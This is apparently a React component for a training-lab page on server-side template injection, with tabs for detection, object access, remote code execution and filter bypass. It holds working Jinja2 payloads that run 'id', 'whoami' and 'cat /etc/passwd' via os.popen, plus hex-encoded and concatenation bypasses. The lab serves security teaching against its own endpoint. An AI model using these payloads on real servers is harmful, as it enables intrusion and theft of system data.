import { useState, useRef, useEffect } from 'react';
import { Button } from '@/components/ui/button';
import { Badge } from '@/components/ui/badge';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
import { Collapsible, CollapsibleContent, CollapsibleTrigger } from '@/components/ui/collapsible';
import { Zap, Shield, ChevronDown, Code, Terminal, AlertTriangle, CheckCircle, FileCode, Bug } from 'lucide-react';

interface SSTIResult {
  success?: boolean;
  output?: string;
  rendered?: string;
  template_engine?: string;
  error?: string;
  message?: string;
  flag?: string;
  vulnerability?: {
    detected: boolean;
    payload: string;
    engine: string;
    severity: string;
    message: string;
  };
  rce_detected?: boolean;
  command_output?: string;
}

export default function ServerSideTemplateInjectionLab() {
  const [activeTab, setActiveTab] = useState('mission');
  const [isHardMode, setIsHardMode] = useState(false);
  const [loading, setLoading] = useState(false);
  const [result, setResult] = useState<SSTIResult | null>(null);
  const [solutionStates, setSolutionStates] = useState<Record<string, boolean>>({
    detection: false,
    exploitation: false,
    rce: false,
    bypass: false
  });
  const resultsRef = useRef<HTMLDivElement>(null);

  const [templateInput, setTemplateInput] = useState('');
  const [nameInput, setNameInput] = useState('');

  const toggleSolution = (technique: string) => {
    setSolutionStates(prev => ({ ...prev, [technique]: !prev[technique] }));
  };

  useEffect(() => {
    if (result && resultsRef.current) {
      resultsRef.current.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
    }
  }, [result]);

  const executePayload = async (payload?: string, additionalParams?: Record<string, string>) => {
    setLoading(true);
    setResult(null);

    try {
      const params = new URLSearchParams({
        template: payload || templateInput,
        name: nameInput || 'User',
        ...(isHardMode ? { mode: 'hard' } : {}),
        ...additionalParams
      });

      const response = await fetch(`/api/vuln/ssti?${params}`);
      const data = await response.json();
      setResult(data);
    } catch (error) {
      setResult({ error: 'Network error - could not connect to server' });
    } finally {
      setLoading(false);
    }
  };

  const renderResults = () => {
    if (!result) return null;

    if (result.error) {
      return (
        <div ref={resultsRef} className="mt-4 p-4 bg-red-950/50 border border-red-500/50 rounded-lg">
          <div className="flex items-center gap-2 text-red-400 font-semibold mb-2">
            <AlertTriangle size={18} />
            Error
          </div>
          <p className="text-red-300 text-sm">{result.error}</p>
        </div>
      );
    }

    const hasVulnerability = result.vulnerability?.detected;
    const isRCE = result.rce_detected;

    return (
      <div ref={resultsRef} className="mt-4 space-y-3">
        {result.flag && (
          <div className="p-4 bg-green-950/50 border border-green-500/50 rounded-lg">
            <div className="flex items-center gap-2 text-green-400 font-semibold mb-2">
              <CheckCircle size={18} />
              SSTI Exploited Successfully!
            </div>
            <code className="text-green-300 bg-green-900/30 px-2 py-1 rounded">{result.flag}</code>
          </div>
        )}

        {hasVulnerability && (
          <div className={`p-4 rounded-lg border ${isRCE ? 'bg-rose-950/30 border-rose-600/30' : 'bg-purple-950/30 border-purple-600/30'}`}>
            <div className={`flex items-center gap-2 font-semibold mb-2 ${isRCE ? 'text-rose-400' : 'text-purple-400'}`}>
              <AlertTriangle size={18} />
              {isRCE ? 'Remote Code Execution Achieved!' : 'SSTI Vulnerability Detected'}
            </div>
            <div className="grid grid-cols-2 gap-3 text-sm mt-3">
              <div className="p-2 bg-slate-800/50 rounded">
                <div className="text-slate-500 text-xs">Template Engine</div>
                <div className="text-white font-mono">{result.vulnerability?.engine || result.template_engine || 'Unknown'}</div>
              </div>
              <div className="p-2 bg-slate-800/50 rounded border-l-2 border-purple-500">
                <div className="text-slate-500 text-xs">Severity</div>
                <div className={`font-mono ${isRCE ? 'text-rose-400' : 'text-purple-400'}`}>
                  {result.vulnerability?.severity || (isRCE ? 'Critical' : 'High')}
                </div>
              </div>
            </div>
            <p className={`text-sm mt-2 ${isRCE ? 'text-rose-300' : 'text-purple-300'}`}>
              {result.vulnerability?.message || 'Template injection vulnerability confirmed'}
            </p>
          </div>
        )}

        {result.command_output && (
          <div className="p-4 bg-rose-950/30 border border-rose-600/30 rounded-lg">
            <div className="flex items-center gap-2 text-rose-400 font-semibold mb-2">
              <Terminal size={18} />
              Command Execution Output
            </div>
            <pre className="text-rose-300 bg-slate-900/50 p-3 rounded text-sm overflow-x-auto font-mono">
              {result.command_output}
            </pre>
          </div>
        )}

        {(result.rendered || result.output) && (
          <div className="p-4 bg-slate-900/50 border border-slate-600/50 rounded-lg">
            <h4 className="text-[#B14EFF] font-semibold text-sm mb-3 flex items-center gap-2">
              <FileCode size={14} />
              Template Output
            </h4>
            <pre className="text-slate-300 bg-slate-800/50 p-3 rounded text-sm overflow-x-auto font-mono whitespace-pre-wrap">
              {result.rendered || result.output}
            </pre>
          </div>
        )}

        {result.message && !result.flag && (
          <div className="p-4 bg-slate-900/50 border border-slate-600/50 rounded-lg">
            <p className="text-slate-300 text-sm">{result.message}</p>
          </div>
        )}
      </div>
    );
  };

  return (
    <div className="cyber-card border border-purple-900/50 mb-6 bg-gradient-to-br from-purple-950/20 to-[#0A0A14]">
      <div className="bg-gradient-to-r from-purple-950/40 to-[#0D0D14] border-b border-purple-900/30 px-6 py-5">
        <div className="flex items-center justify-between">
          <div>
            <h2 className="text-xl font-bold flex items-center">
              <span className="text-[#B14EFF]">Server-Side Template Injection Lab</span>
              <Badge className="ml-3 bg-purple-500/20 text-[#B14EFF] border-purple-500/30">SSTI</Badge>
            </h2>
            <p className="text-gray-400 mt-1 text-sm">
              Exploit template engines to achieve remote code execution
            </p>
          </div>
          <div className="flex gap-2">
            <Button
              size="sm"
              variant={!isHardMode ? "default" : "outline"}
              className={!isHardMode ? "bg-[#B14EFF] hover:bg-[#B14EFF]/80" : "border-[#B14EFF]/50 text-[#B14EFF]"}
              onClick={() => setIsHardMode(false)}
            >
              <Zap size={16} className="mr-1" />
              Easy
            </Button>
            <Button
              size="sm"
              variant={isHardMode ? "default" : "outline"}
              className={isHardMode ? "bg-purple-800 hover:bg-purple-700" : "border-purple-800/50 text-[#B14EFF]"}
              onClick={() => setIsHardMode(true)}
            >
              <Shield size={16} className="mr-1" />
              Hard
            </Button>
          </div>
        </div>
        {isHardMode && (
          <div className="mt-3 p-2 bg-purple-900/30 border border-purple-600/30 rounded text-xs text-purple-300">
            Enhanced Filtering - Common payloads blocked. Try sandbox escapes and filter bypass techniques!
          </div>
        )}
      </div>

      <div className="p-6">
        <Tabs value={activeTab} onValueChange={setActiveTab}>
          <TabsList className="grid grid-cols-5 bg-slate-900/50">
            <TabsTrigger value="mission" className="text-xs">Mission</TabsTrigger>
            <TabsTrigger value="detection" className="text-xs">Detection</TabsTrigger>
            <TabsTrigger value="exploitation" className="text-xs">Exploitation</TabsTrigger>
            <TabsTrigger value="rce" className="text-xs">RCE</TabsTrigger>
            <TabsTrigger value="bypass" className="text-xs">Bypass</TabsTrigger>
          </TabsList>

          <TabsContent value="mission" className="mt-4">
            <Card className="bg-slate-900/50 border-purple-900/30">
              <CardHeader>
                <CardTitle className="text-[#B14EFF] flex items-center gap-2">
                  <Code size={20} />
                  Mission Briefing
                </CardTitle>
              </CardHeader>
              <CardContent className="space-y-4 text-sm">
                <div className="p-4 bg-slate-800/50 rounded-lg border border-slate-700/50">
                  <h4 className="font-semibold text-white mb-2">Scenario</h4>
                  <p className="text-slate-300">
                    A web application uses server-side templates to generate dynamic content. The template engine 
                    accepts user input without proper sanitization, potentially allowing you to inject malicious 
                    template syntax and execute arbitrary code on the server.
                  </p>
                </div>

                <div className="p-4 bg-slate-800/50 rounded-lg border border-slate-700/50">
                  <h4 className="font-semibold text-white mb-2">Your Objectives</h4>
                  <ol className="list-decimal list-inside space-y-2 text-slate-300">
                    <li><strong>Detection:</strong> Identify the template engine using probe payloads</li>
                    <li><strong>Exploitation:</strong> Access internal objects and methods</li>
                    <li><strong>RCE:</strong> Achieve remote code execution via template injection</li>
                    <li><strong>Bypass:</strong> Evade filters and sandbox restrictions</li>
                  </ol>
                </div>

                <div className="p-4 bg-purple-900/20 rounded-lg border border-purple-600/30">
                  <h4 className="font-semibold text-purple-400 mb-2">How SSTI Works</h4>
                  <p className="text-slate-300 text-xs">
                    Server-Side Template Injection occurs when user input is embedded into templates before 
                    rendering. Template engines like Jinja2, Twig, Freemarker, and Velocity have powerful 
                    features that can be abused. By injecting template directives like {"{{7*7}}"} or 
                    {"${7*7}"}, attackers can detect vulnerabilities and escalate to code execution by 
                    accessing internal objects and methods.
                  </p>
                </div>

                <Button
                  className="w-full bg-[#B14EFF] hover:bg-[#B14EFF]/80"
                  onClick={() => setActiveTab('detection')}
                >
                  Start Lab - Detection Phase
                </Button>
              </CardContent>
            </Card>
          </TabsContent>

          <TabsContent value="detection" className="mt-4">
            <Card className="bg-slate-900/50 border-purple-900/30">
              <CardHeader>
                <CardTitle className="text-orange-400 flex items-center gap-2">
                  <Bug size={20} />
                  Template Engine Detection
                </CardTitle>
              </CardHeader>
              <CardContent className="space-y-4">
                <div className="p-3 bg-slate-800/50 rounded border border-slate-700/50 text-sm">
                  <h4 className="font-semibold text-white mb-2">Instructions</h4>
                  <ol className="list-decimal list-inside space-y-1 text-slate-300 text-xs">
                    <li>Use mathematical probe payloads to detect template processing</li>
                    <li>Different engines use different syntax: {"{{...}}"}, {"${...}"}, {"<%...%>"}</li>
                    <li>If {"{{7*7}}"} renders as "49", SSTI is confirmed</li>
                    <li>Identify the template engine based on syntax and behavior</li>
                  </ol>
                </div>

                <div className="space-y-3">
                  <label className="text-sm font-medium text-slate-300">Template Injection Payload</label>
                  <div className="flex gap-2">
                    <input
                      type="text"
                      value={templateInput}
                      onChange={(e) => setTemplateInput(e.target.value)}
                      placeholder="Enter payload (e.g., {{7*7}})"
                      className="flex-1 px-3 py-2 bg-slate-800 border border-slate-600 rounded text-white text-sm font-mono"
                    />
                    <Button
                      onClick={() => executePayload()}
                      disabled={loading}
                      className="bg-orange-600 hover:bg-orange-500"
                    >
                      {loading ? 'Loading...' : 'Inject'}
                    </Button>
                  </div>
                </div>

                <div className="flex gap-2 flex-wrap">
                  <Button size="sm" variant="outline" onClick={() => executePayload('{{7*7}}')} className="text-xs border-[#B14EFF]/30 text-[#B14EFF]">
                    {"{{7*7}}"}
                  </Button>
                  <Button size="sm" variant="outline" onClick={() => executePayload('${7*7}')} className="text-xs border-[#B14EFF]/30 text-[#B14EFF]">
                    {"${7*7}"}
                  </Button>
                  <Button size="sm" variant="outline" onClick={() => executePayload("{{7*'7'}}")} className="text-xs border-[#B14EFF]/30 text-[#B14EFF]">
                    {"{{7*'7'}}"}
                  </Button>
                  <Button size="sm" variant="outline" onClick={() => executePayload('<%=7*7%>')} className="text-xs border-[#B14EFF]/30 text-[#B14EFF]">
                    {"<%=7*7%>"}
                  </Button>
                </div>

                {renderResults()}

                <Collapsible open={solutionStates.detection} onOpenChange={() => toggleSolution('detection')}>
                  <CollapsibleTrigger asChild>
                    <Button variant="ghost" className="w-full text-slate-400 hover:text-white">
                      <ChevronDown className={`mr-2 transition-transform ${solutionStates.detection ? 'rotate-180' : ''}`} size={16} />
                      {solutionStates.detection ? 'Hide' : 'Show'} Solution
                    </Button>
                  </CollapsibleTrigger>
                  <CollapsibleContent className="mt-2">
                    <div className="p-4 bg-slate-800/80 rounded border border-slate-600/50 text-sm space-y-2">
                      <p className="text-slate-300"><strong>Jinja2/Twig:</strong> <code className="bg-slate-700 px-1 rounded">{"{{7*7}}"}</code> → 49</p>
                      <p className="text-slate-300"><strong>Freemarker:</strong> <code className="bg-slate-700 px-1 rounded">{"${7*7}"}</code> → 49</p>
                      <p className="text-slate-300"><strong>Jinja2 string:</strong> <code className="bg-slate-700 px-1 rounded">{"{{7*'7'}}"}</code> → 7777777</p>
                      <p className="text-slate-300"><strong>ERB:</strong> <code className="bg-slate-700 px-1 rounded">{"<%=7*7%>"}</code> → 49</p>
                    </div>
                  </CollapsibleContent>
                </Collapsible>
              </CardContent>
            </Card>
          </TabsContent>

          <TabsContent value="exploitation" className="mt-4">
            <Card className="bg-slate-900/50 border-purple-900/30">
              <CardHeader>
                <CardTitle className="text-blue-400 flex items-center gap-2">
                  <FileCode size={20} />
                  Object Access & Exploitation
                </CardTitle>
              </CardHeader>
              <CardContent className="space-y-4">
                <div className="p-3 bg-slate-800/50 rounded border border-slate-700/50 text-sm">
                  <h4 className="font-semibold text-white mb-2">Instructions</h4>
                  <ol className="list-decimal list-inside space-y-1 text-slate-300 text-xs">
                    <li>Access internal template objects and classes</li>
                    <li>Navigate object hierarchy to find dangerous methods</li>
                    <li>Use __class__, __mro__, __subclasses__ to explore Python objects</li>
                    <li>Read configuration files and sensitive data</li>
                  </ol>
                </div>

                <div className="space-y-3">
                  <label className="text-sm font-medium text-slate-300">Exploitation Payload</label>
                  <div className="flex gap-2">
                    <input
                      type="text"
                      value={templateInput}
                      onChange={(e) => setTemplateInput(e.target.value)}
                      placeholder="Enter exploitation payload"
                      className="flex-1 px-3 py-2 bg-slate-800 border border-slate-600 rounded text-white text-sm font-mono"
                    />
                    <Button
                      onClick={() => executePayload()}
                      disabled={loading}
                      className="bg-blue-600 hover:bg-blue-500"
                    >
                      {loading ? 'Loading...' : 'Execute'}
                    </Button>
                  </div>
                </div>

                <div className="flex gap-2 flex-wrap">
                  <Button size="sm" variant="outline" onClick={() => executePayload("{{config}}")} className="text-xs border-[#B14EFF]/30 text-[#B14EFF]">
                    {"{{config}}"}
                  </Button>
                  <Button size="sm" variant="outline" onClick={() => executePayload("{{self}}")} className="text-xs border-[#B14EFF]/30 text-[#B14EFF]">
                    {"{{self}}"}
                  </Button>
                  <Button size="sm" variant="outline" onClick={() => executePayload("{{''.__class__}}")} className="text-xs border-[#B14EFF]/30 text-[#B14EFF]">
                    {"{{''.__class__}}"}
                  </Button>
                  <Button size="sm" variant="outline" onClick={() => executePayload("{{''.__class__.__mro__}}")} className="text-xs border-[#B14EFF]/30 text-[#B14EFF]">
                    {"{{''.__class__.__mro__}}"}
                  </Button>
                </div>

                {renderResults()}

                <Collapsible open={solutionStates.exploitation} onOpenChange={() => toggleSolution('exploitation')}>
                  <CollapsibleTrigger asChild>
                    <Button variant="ghost" className="w-full text-slate-400 hover:text-white">
                      <ChevronDown className={`mr-2 transition-transform ${solutionStates.exploitation ? 'rotate-180' : ''}`} size={16} />
                      {solutionStates.exploitation ? 'Hide' : 'Show'} Solution
                    </Button>
                  </CollapsibleTrigger>
                  <CollapsibleContent className="mt-2">
                    <div className="p-4 bg-slate-800/80 rounded border border-slate-600/50 text-sm space-y-2">
                      <p className="text-slate-300"><strong>Config:</strong> <code className="bg-slate-700 px-1 rounded">{"{{config}}"}</code> or <code className="bg-slate-700 px-1 rounded">{"{{config.items()}}"}</code></p>
                      <p className="text-slate-300"><strong>Class:</strong> <code className="bg-slate-700 px-1 rounded">{"{{''.__class__.__mro__[1].__subclasses__()}}"}</code></p>
                      <p className="text-slate-300"><strong>Request:</strong> <code className="bg-slate-700 px-1 rounded">{"{{request.environ}}"}</code></p>
                    </div>
                  </CollapsibleContent>
                </Collapsible>
              </CardContent>
            </Card>
          </TabsContent>

          <TabsContent value="rce" className="mt-4">
            <Card className="bg-slate-900/50 border-purple-900/30">
              <CardHeader>
                <CardTitle className="text-rose-400 flex items-center gap-2">
                  <Terminal size={20} />
                  Remote Code Execution
                </CardTitle>
              </CardHeader>
              <CardContent className="space-y-4">
                <div className="p-3 bg-slate-800/50 rounded border border-slate-700/50 text-sm">
                  <h4 className="font-semibold text-white mb-2">Instructions</h4>
                  <ol className="list-decimal list-inside space-y-1 text-slate-300 text-xs">
                    <li>Use discovered object access to reach subprocess/os modules</li>
                    <li>Find classes like Popen, subprocess, or os in __subclasses__</li>
                    <li>Execute system commands through template injection</li>
                    <li>Exfiltrate sensitive data from the server</li>
                  </ol>
                </div>

                <div className="p-3 bg-rose-950/30 border border-rose-600/30 rounded text-sm">
                  <div className="flex items-center gap-2 text-rose-400 mb-1">
                    <AlertTriangle size={14} />
                    Warning
                  </div>
                  <p className="text-slate-300 text-xs">RCE payloads can execute arbitrary commands on the server. In a real scenario, this would allow complete server compromise.</p>
                </div>

                <div className="space-y-3">
                  <label className="text-sm font-medium text-slate-300">RCE Payload</label>
                  <div className="flex gap-2">
                    <input
                      type="text"
                      value={templateInput}
                      onChange={(e) => setTemplateInput(e.target.value)}
                      placeholder="Enter RCE payload"
                      className="flex-1 px-3 py-2 bg-slate-800 border border-slate-600 rounded text-white text-sm font-mono"
                    />
                    <Button
                      onClick={() => executePayload()}
                      disabled={loading}
                      className="bg-rose-600 hover:bg-rose-500"
                    >
                      {loading ? 'Loading...' : 'Execute RCE'}
                    </Button>
                  </div>
                </div>

                <div className="flex gap-2 flex-wrap">
                  <Button size="sm" variant="outline" onClick={() => executePayload("{{''.__class__.__mro__[1].__subclasses__()[400]('id',shell=True,stdout=-1).communicate()}}")} className="text-xs border-rose-500/30 text-rose-400">
                    Popen (id)
                  </Button>
                  <Button size="sm" variant="outline" onClick={() => executePayload("{{config.__class__.__init__.__globals__['os'].popen('whoami').read()}}")} className="text-xs border-rose-500/30 text-rose-400">
                    os.popen (whoami)
                  </Button>
                  <Button size="sm" variant="outline" onClick={() => executePayload("{{lipsum.__globals__['os'].popen('cat /etc/passwd').read()}}")} className="text-xs border-rose-500/30 text-rose-400">
                    /etc/passwd
                  </Button>
                </div>

                {renderResults()}

                <Collapsible open={solutionStates.rce} onOpenChange={() => toggleSolution('rce')}>
                  <CollapsibleTrigger asChild>
                    <Button variant="ghost" className="w-full text-slate-400 hover:text-white">
                      <ChevronDown className={`mr-2 transition-transform ${solutionStates.rce ? 'rotate-180' : ''}`} size={16} />
                      {solutionStates.rce ? 'Hide' : 'Show'} Solution
                    </Button>
                  </CollapsibleTrigger>
                  <CollapsibleContent className="mt-2">
                    <div className="p-4 bg-slate-800/80 rounded border border-slate-600/50 text-sm space-y-2">
                      <p className="text-slate-300"><strong>Via lipsum:</strong></p>
                      <code className="block bg-slate-700 px-2 py-1 rounded text-xs overflow-x-auto">{"{{lipsum.__globals__['os'].popen('id').read()}}"}</code>
                      <p className="text-slate-300 mt-2"><strong>Via config:</strong></p>
                      <code className="block bg-slate-700 px-2 py-1 rounded text-xs overflow-x-auto">{"{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"}</code>
                      <p className="text-slate-300 mt-2"><strong>Via cycler:</strong></p>
                      <code className="block bg-slate-700 px-2 py-1 rounded text-xs overflow-x-auto">{"{{cycler.__init__.__globals__.os.popen('id').read()}}"}</code>
                    </div>
                  </CollapsibleContent>
                </Collapsible>
              </CardContent>
            </Card>
          </TabsContent>

          <TabsContent value="bypass" className="mt-4">
            <Card className="bg-slate-900/50 border-purple-900/30">
              <CardHeader>
                <CardTitle className="text-green-400 flex items-center gap-2">
                  <Shield size={20} />
                  Filter Bypass Techniques
                </CardTitle>
              </CardHeader>
              <CardContent className="space-y-4">
                <div className="p-3 bg-slate-800/50 rounded border border-slate-700/50 text-sm">
                  <h4 className="font-semibold text-white mb-2">Instructions (Enable Hard Mode!)</h4>
                  <ol className="list-decimal list-inside space-y-1 text-slate-300 text-xs">
                    <li>Switch to Hard Mode - common keywords are filtered</li>
                    <li>Use string concatenation: 'con'+'fig' instead of 'config'</li>
                    <li>Use attribute access via getattr() or |attr()</li>
                    <li>Encode payloads using hex, base64, or unicode</li>
                    <li>Bypass using Jinja2 filters and alternative syntax</li>
                  </ol>
                </div>

                <div className="space-y-3">
                  <label className="text-sm font-medium text-slate-300">Bypass Payload</label>
                  <div className="flex gap-2">
                    <input
                      type="text"
                      value={templateInput}
                      onChange={(e) => setTemplateInput(e.target.value)}
                      placeholder="Enter bypass payload"
                      className="flex-1 px-3 py-2 bg-slate-800 border border-slate-600 rounded text-white text-sm font-mono"
                    />
                    <Button
                      onClick={() => executePayload()}
                      disabled={loading}
                      className="bg-green-600 hover:bg-green-500"
                    >
                      {loading ? 'Loading...' : 'Attempt Bypass'}
                    </Button>
                  </div>
                </div>

                <div className="flex gap-2 flex-wrap">
                  <Button size="sm" variant="outline" onClick={() => executePayload("{{'con'+'fig'}}")} className="text-xs border-green-500/30 text-green-400">
                    String Concat
                  </Button>
                  <Button size="sm" variant="outline" onClick={() => executePayload("{{request|attr('application')}}")} className="text-xs border-green-500/30 text-green-400">
                    |attr() Filter
                  </Button>
                  <Button size="sm" variant="outline" onClick={() => executePayload("{{''['\\x5f\\x5fclass\\x5f\\x5f']}}")} className="text-xs border-green-500/30 text-green-400">
                    Hex Encoding
                  </Button>
                  <Button size="sm" variant="outline" onClick={() => executePayload("{% set x='__cla'+'ss__' %}{{''[x]}}")} className="text-xs border-green-500/30 text-green-400">
                    Variable Set
                  </Button>
                </div>

                {renderResults()}

                <Collapsible open={solutionStates.bypass} onOpenChange={() => toggleSolution('bypass')}>
                  <CollapsibleTrigger asChild>
                    <Button variant="ghost" className="w-full text-slate-400 hover:text-white">
                      <ChevronDown className={`mr-2 transition-transform ${solutionStates.bypass ? 'rotate-180' : ''}`} size={16} />
                      {solutionStates.bypass ? 'Hide' : 'Show'} Solution
                    </Button>
                  </CollapsibleTrigger>
                  <CollapsibleContent className="mt-2">
                    <div className="p-4 bg-slate-800/80 rounded border border-slate-600/50 text-sm space-y-2">
                      <p className="text-slate-300"><strong>String concat:</strong> <code className="bg-slate-700 px-1 rounded">{"{{'con'+'fig'}}"}</code></p>
                      <p className="text-slate-300"><strong>attr filter:</strong> <code className="bg-slate-700 px-1 rounded">{"{{request|attr('application')|attr('\\x5f\\x5fglobals\\x5f\\x5f')}}"}</code></p>
                      <p className="text-slate-300"><strong>Hex bypass:</strong> <code className="bg-slate-700 px-1 rounded">{"{{''['\\x5f\\x5fclass\\x5f\\x5f']['\\x5f\\x5fmro\\x5f\\x5f']}}"}</code></p>
                      <p className="text-slate-300"><strong>Variable:</strong> <code className="bg-slate-700 px-1 rounded">{"{% set c='__class__' %}{{''[c]}}"}</code></p>
                    </div>
                  </CollapsibleContent>
                </Collapsible>
              </CardContent>
            </Card>
          </TabsContent>
        </Tabs>
      </div>
    </div>
  );
}
